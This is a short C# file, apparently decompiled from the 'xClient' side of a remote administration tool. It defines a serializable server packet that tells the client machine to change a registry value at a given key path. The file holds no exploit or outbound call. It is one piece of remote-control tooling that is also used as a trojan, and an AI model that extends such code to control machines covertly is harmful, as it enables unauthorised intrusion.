using System;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoChangeRegistryValue : GInterface4
{
	public string KeyPath { get; set; }

	public RegValueData Value { get; set; }

	public DoChangeRegistryValue(string keyPath, RegValueData value)
	{
		KeyPath = keyPath;
		Value = value;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
